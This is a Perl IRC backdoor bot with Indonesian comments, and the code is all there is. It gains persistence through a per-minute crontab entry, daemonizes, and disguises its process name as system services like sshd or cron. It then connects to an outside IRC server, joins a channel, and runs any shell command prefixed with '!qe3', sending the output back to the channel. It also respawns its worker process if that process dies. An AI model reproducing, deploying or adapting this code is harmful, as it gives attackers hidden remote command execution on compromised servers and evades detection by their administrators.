#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use File::Basename;
use File::Spec::Functions qw(rel2abs);
use POSIX qw(setsid);

# Mendefinisikan konstanta WNOHANG secara manual
use constant WNOHANG => 1;

# Path ke file PID
my $pid_file = '/dev/shm/qe3.pid';

# Path ke skrip ini
my $script_path = rel2abs($0);

# Daftar nama proses
my @rps = ("/usr/local/apache/bin/httpd -DSSL",
           "/usr/sbin/httpd -k start -DSSL",
           "/usr/sbin/httpd",
           "/usr/sbin/sshd -i",
           "/usr/sbin/sshd",
           "/usr/sbin/sshd -D",
           "/usr/sbin/apache2 -k start",
           "/sbin/syslogd",
           "/sbin/klogd -c 1 -x -x",
           "/usr/sbin/acpid",
           "/usr/sbin/cron");
my $process = $rps[rand scalar @rps];

# Fungsi untuk membuat nickname acak
sub generate_random_nick {
    my @chars = ('A'..'Z', 'a'..'z', '0'..'9');
    my $nick = '';
    $nick .= $chars[rand @chars] for 1..8;
    return $nick;
}

# Fungsi untuk menghubungkan ke IRC
sub connect_to_irc {
    my $server = 'irc.ongisnade.co.id';
    my $port = 7000;
    my $nick = generate_random_nick();

    my $socket = IO::Socket::INET->new(
        PeerAddr => $server,
        PeerPort => $port,
        Proto    => 'tcp'
    ) or die "Could not connect to IRC server: $!";

    print $socket "NICK $nick\r\n";
    print $socket "USER $nick 8 * :Perl IRC Client\r\n";

    return $socket;
}

# Fungsi untuk memeriksa dan membuat file PID
sub create_pid_file {
    open(my $fh, '>', $pid_file) or die "Could not create PID file: $!";
    print $fh $$;
    close($fh);
}

# Fungsi untuk memeriksa apakah skrip sudah berjalan
sub check_if_already_running {
    if (-e $pid_file) {
        open(my $fh, '<', $pid_file) or die "Could not open PID file: $!";
        my $pid = <$fh>;
        close($fh);
        chomp $pid;
        if ($pid && kill 0, $pid) {
            print "Script is already running with PID $pid\n";
            exit 0;
        } else {
            print "PID file exists but process not running. Starting new process.\n";
        }
    }
}

# Fungsi untuk menambahkan cron job jika belum ada
sub ensure_cron_job {
    my $cron_job = "* * * * * /usr/bin/perl $script_path\n";
    my $cron_exists = `crontab -l 2>/dev/null | grep -F "$script_path"`;
    unless ($cron_exists) {
        my $current_crontab = `crontab -l 2>/dev/null`;
        open(my $fh, '| crontab -') or die "Could not open crontab: $!";
        print $fh $current_crontab;
        print $fh $cron_job;
        close($fh);
    }
}

# Fungsi untuk mengeksekusi perintah shell
sub execute_command {
    my ($command) = @_;
    my $output = `$command 2>&1`;
    return $output;
}

# Fungsi untuk mengirim pesan ke channel IRC
sub send_to_channel {
    my ($socket, $message) = @_;
    $message =~ s/\r?\n/ | /g;  # Ganti newline dengan separator
    print $socket "PRIVMSG #surabayacity :$message\r\n";
}

# Forking dan detachment dari terminal
sub daemonize {
    my $pid = fork();
    if ($pid < 0) {
        die "Fork failed: $!";
    }
    if ($pid > 0) {
        exit 0;
    }
    setsid() or die "setsid failed: $!";
    chdir '/' or die "Can't chdir to /: $!";
    open(STDIN, '/dev/null') or die "Can't read /dev/null: $!";
    open(STDOUT, '>>/dev/null') or die "Can't write to /dev/null: $!";
    open(STDERR, '>>/dev/null') or die "Can't write to /dev/null: $!";
    umask 0;
}

# Fungsi untuk mengubah nama proses
sub set_process_name {
    my ($name) = @_;
    open(my $fh, '>', '/proc/self/comm') or die "Can't open /proc/self/comm: $!";
    print $fh $name;
    close($fh);
}

# Pastikan cron job ada
ensure_cron_job();

# Memeriksa apakah skrip sudah berjalan
check_if_already_running();

# Jalankan daemonize
daemonize();

# Ubah nama proses
set_process_name($process);

# Membuat file PID
create_pid_file();

my $pid = fork();
if (!defined $pid) {
    die "Cannot fork: $!";
}

if ($pid == 0) {
    # Ubah nama proses anak
    set_process_name($process);

    # Ini adalah proses anak, jalankan proses utama Anda di sini
    my $socket = connect_to_irc();
    my $connected = 0;

    # Loop koneksi IRC
    while (my $answer = <$socket>) {
        # Tampilkan balasan server
        print $answer;

        # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
        if ($answer =~ m/^PING (.*?)$/gi) {
            print "Replying with PONG ".$1."\n";
            print $socket "PONG ".$1."\r\n";
        }

        # Periksa apakah sudah terhubung dan join channel
        if (!$connected && $answer =~ /376|422/) {
            print $socket "JOIN #surabayacity\r\n";
            $connected = 1;
        }

        # Mulai eksekusi perintah jika ada !qe3
        if ($answer =~ /!qe3\s+(.*)/) {
            my $command = $1;
            my $result = execute_command($command);
            send_to_channel($socket, $result);
        }
    }
} else {
    # Ini adalah proses induk, memantau proses anak
    $SIG{CHLD} = sub {
        waitpid(-1, WNOHANG);
        # Jika proses anak mati, kita restart proses anak
        if ($? == -1 || $? != 0) {
            $pid = fork();
            if ($pid == 0) {
                # Ubah nama proses anak
                set_process_name($process);

                my $socket = connect_to_irc();
                my $connected = 0;

                # Loop koneksi IRC
                while (my $answer = <$socket>) {
                    # Tampilkan balasan server
                    print $answer;

                    # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
                    if ($answer =~ m/^PING (.*?)$/gi) {
                        print "Replying with PONG ".$1."\n";
                        print $socket "PONG ".$1."\r\n";
                    }

                    # Periksa apakah sudah terhubung dan join channel
                    if (!$connected && $answer =~ /376|422/) {
                        print $socket "JOIN #surabayacity\r\n";
                        $connected = 1;
                    }

                    # Mulai eksekusi perintah jika ada !qe3
                    if ($answer =~ /!qe3\s+(.*)/) {
                        my $command = $1;
                        my $result = execute_command($command);
                        send_to_channel($socket, $result);
                    }
                }
            }
        }
    };

    while (1) {
        # Proses induk berjalan, memantau proses anak
        sleep(1);
    }
}
